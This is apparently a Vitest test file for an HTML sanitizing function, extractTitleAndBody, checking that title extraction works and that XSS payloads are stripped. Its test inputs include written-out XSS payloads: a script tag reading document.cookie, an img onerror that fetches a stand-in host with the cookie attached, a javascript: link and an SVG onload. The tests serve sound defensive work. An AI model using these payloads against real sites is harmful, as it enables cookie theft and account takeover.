// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { extractTitleAndBody } from './IntroComponents';

describe('extractTitleAndBody', () => {
  it('returns empty body/null title for empty input', () => {
    expect(extractTitleAndBody('')).toEqual({ title: null, body: '' });
    expect(extractTitleAndBody(null)).toEqual({ title: null, body: '' });
  });

  it('extracts the <h1> as title and strips it from the body', () => {
    const { title, body } = extractTitleAndBody('<h1>Welcome</h1><p>Please read this.</p>');
    expect(title).toBe('Welcome');
    expect(body).not.toContain('<h1');
    expect(body).toContain('Please read this.');
  });

  it('preserves ordinary rich-text formatting produced by the protocol editor', () => {
    const { body } = extractTitleAndBody('<p>Hello <strong>world</strong>, click <a href="https://example.com">here</a>.</p>');
    expect(body).toContain('<strong>world</strong>');
    expect(body).toContain('<a href="https://example.com">here</a>');
  });

  it('strips a <script> tag payload', () => {
    const { body } = extractTitleAndBody('<p>Hi</p><script>alert(document.cookie)</script>');
    expect(body).not.toContain('<script');
    expect(body).not.toContain('alert(');
  });

  it('strips an onerror-based image payload (the classic dangerouslySetInnerHTML XSS vector)', () => {
    const { body } = extractTitleAndBody('<p>Hi</p><img src="x" onerror="fetch(\'https://evil.example.com/steal?c=\'+document.cookie)">');
    expect(body).not.toContain('onerror');
    expect(body).not.toContain('evil.example.com');
    // The <img> itself (a legitimate tag for real content images) is allowed to remain —
    // only the dangerous attribute must be gone.
  });

  it('strips a javascript: URL disguised as a link', () => {
    const { body } = extractTitleAndBody('<a href="javascript:fetch(\'https://evil.example.com\')">click me</a>');
    expect(body).not.toContain('javascript:');
    expect(body).not.toContain('evil.example.com');
  });

  it('strips an SVG onload payload', () => {
    const { body } = extractTitleAndBody('<svg onload="alert(1)"></svg>');
    expect(body).not.toContain('onload');
  });

  it('keeps a legitimate <img> tag with a plain src attribute', () => {
    const { body } = extractTitleAndBody('<p>See below:</p><img src="/uploads/diagram.png" alt="diagram">');
    expect(body).toContain('<img');
    expect(body).toContain('diagram.png');
  });
});
